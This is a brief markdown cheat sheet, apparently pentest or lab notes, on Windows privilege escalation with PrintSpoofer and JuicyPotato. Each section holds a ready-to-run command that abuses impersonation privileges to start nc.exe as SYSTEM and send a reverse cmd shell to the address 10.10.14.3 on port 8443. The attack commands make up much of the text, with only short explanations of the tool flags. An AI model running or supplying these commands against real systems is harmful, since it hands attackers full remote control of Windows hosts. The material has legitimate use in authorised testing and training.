# PrintSpoofer.exe
`JuicyPotato` doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.
```powershell
.\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

---

# JuicyPotato.exe
for older systems `JuicyPotato` can be used. where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
```powershell
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

